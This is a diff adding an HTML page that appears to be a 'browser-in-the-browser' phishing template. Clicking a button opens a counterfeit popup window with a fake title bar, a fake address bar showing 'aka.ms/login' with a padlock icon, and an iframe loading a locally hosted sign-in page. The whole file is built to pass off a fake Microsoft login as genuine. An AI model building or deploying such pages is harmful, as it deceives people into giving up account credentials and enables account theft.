@@ -1,0 +1,41 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="style.css">
+	<script src="../jquery.min.js"></script>
+	<title>Sign in to your account</title>
+	<link rel="icon" href="../favicon.ico" type="image/x-icon">
+</head>
+<body>
+<button title="https://aka.ms/login" id="clickme" style="margin-left:auto; margin-right: auto; margin-top: 0%; text-align: center; display: block;"> <img src="./login.png" alt="Submit"></button>
+
+<div id="window" style="margin:auto; position: relative; bottom: 2.5%; display: none;">
+<!-- Title bar start -->
+<div id="title-bar-width">
+	<div id="title-bar">
+		<div style="margin-top:5px;">
+			<img src="./logo.svg" width="20px" height="15px" id="logo">
+			<span id="logo-description">Sign in to your account</span>
+		</div>
+
+		<div>
+			<span id="minimize">&#8212;</span>
+			<span id="square">□</span>
+			<span id="exit">✕</span>
+		</div>
+	</div>
+	<div id="url-bar">
+		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
+		<span id="domain-name">aka.ms</span>
+		<span id="domain-path">/login</span>
+	</div>
+</div>
+<!-- Content start -->
+<iframe id="content" src="../login.html" frameBorder="0"></iframe>
+</div>
+</body>
+<script src="script.js"></script>
+</html>
+
